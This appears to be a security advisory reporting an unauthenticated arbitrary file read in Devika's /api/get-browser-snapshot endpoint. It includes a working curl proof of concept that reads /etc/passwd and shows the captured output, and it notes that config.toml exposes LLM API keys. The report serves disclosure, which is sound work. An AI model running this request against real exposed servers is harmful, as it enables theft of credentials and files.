# Devika: unauthenticated arbitrary file read via /api/get-browser-snapshot

## Description

Devika's backend binds `0.0.0.0:1337` by default with no authentication on any API route. `GET /api/get-browser-snapshot` (devika.py:123-127) passes the `snapshot_path` query argument straight into `send_file` with no path validation — no prefix constraint, no `..` rejection, no canonicalization check.

## Impact

Any network client that can reach port 1337 (default bind 0.0.0.0, so the whole LAN) reads any file readable by the server process: configuration, source code, `config.toml` (which contains the configured LLM API keys), etc.

## PoC

```bash
# Prerequisite: devika running (python devika.py, default 0.0.0.0:1337)
curl "http://127.0.0.1:1337/api/get-browser-snapshot?snapshot_path=/etc/passwd"
```

## Execution result

```
$ curl "http://127.0.0.1:1337/api/get-browser-snapshot?snapshot_path=/etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
[HTTP 200]
```
